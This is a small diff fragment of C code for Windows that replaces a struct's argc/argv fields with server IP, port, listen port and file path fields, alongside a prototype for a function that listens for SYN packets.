@@ -9,8 +9,10 @@
 #define MAX_PSH_DATA (MAX_PACKET - PSH_PACKET_SIZE)
 
 typedef struct {
-	DWORD argc;
-	LPTSTR * argv;
+	LPTSTR serverIP;
+	USHORT serverPort;
+	USHORT listenPort;
+	LPTSTR filePath;
 } PARAMS, *PPARAMS;
 
 DWORD ListenForSYN(ClayWormAddress *serverAddress);
